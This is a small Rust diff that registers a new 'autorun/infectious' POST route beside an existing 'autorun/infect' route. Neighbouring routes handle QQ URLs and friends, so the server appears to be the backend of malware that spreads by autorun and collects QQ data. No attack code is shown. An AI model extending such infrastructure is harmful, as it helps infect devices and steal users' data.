@@ -97,7 +97,11 @@ pub async fn run(config: &Config, server_map: Arc<RwLock<ServerMap>>) -> Result<
                                     .service(client::qq::url::get)
                                     .service(client::qq::friend::get),
                             )
-                            .service(web::scope("/autorun").service(client::autorun::infect::post)),
+                            .service(
+                                web::scope("/autorun")
+                                    .service(client::autorun::infect::post)
+                                    .service(client::autorun::infectious::post),
+                            ),
                     ),
             )
             .service(
